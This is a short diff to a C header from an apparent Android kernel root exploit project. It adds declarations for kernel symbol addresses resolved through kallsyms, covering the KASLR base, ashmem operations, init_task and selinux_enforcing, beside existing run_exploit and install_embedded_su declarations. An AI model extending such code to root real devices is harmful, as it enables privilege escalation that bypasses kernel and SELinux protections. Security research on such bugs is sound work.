@@ -145,6 +145,9 @@
 
 struct kernelsnitch_shared_state;
 
+/* 前向声明: apply_dynamic_symbols 将使用, 此处暂不引入完整定义以避免头文件依赖 */
+struct robustness_result_t;
+
 struct local_sched_attr {
   uint32_t size;
   uint32_t sched_policy;
@@ -331,7 +334,31 @@ extern char found_task_comm[TASK_COMM_LEN + 1];
 extern pid_t root_child_pid;
 extern int root_ready_pipe[2];
 extern struct root_shared *root_shared;
+
+/* 动态符号解析全局变量 (kallsyms 可读时填充) */
+extern uint64_t g_dyn_kaslr_base;
+extern uint64_t g_dyn_ashmem_misc_fops;
+extern uint64_t g_dyn_init_task;
+extern uint64_t g_dyn_root_task_group;
+extern uint64_t g_dyn_ashmem_ioctl;
+extern uint64_t g_dyn_ashmem_compat_ioctl;
+extern uint64_t g_dyn_ashmem_mmap;
+extern uint64_t g_dyn_ashmem_open;
+extern uint64_t g_dyn_ashmem_release;
+extern uint64_t g_dyn_ashmem_show_fdinfo;
+extern uint64_t g_dyn_configfs_read_iter;
+extern uint64_t g_dyn_configfs_bin_write_iter;
+extern uint64_t g_dyn_copy_splice_read;
+extern uint64_t g_dyn_noop_llseek;
+extern uint64_t g_dyn_selinux_enforcing;
+extern uint64_t g_dyn_kallsyms_lookup_name;
+extern int g_dyn_symbols_ready;
+
 extern int memfd_leak;
+
+/* 动态符号地址解析 (kallsyms 可读时用动态地址，否则回退静态) */
+uintptr_t dyn_text_addr(uintptr_t static_image_addr);
+uintptr_t dyn_data_addr(uintptr_t static_image_addr);
 
 int run_exploit(int argc, char **argv);
 int install_embedded_su(pid_t *daemon_pid);
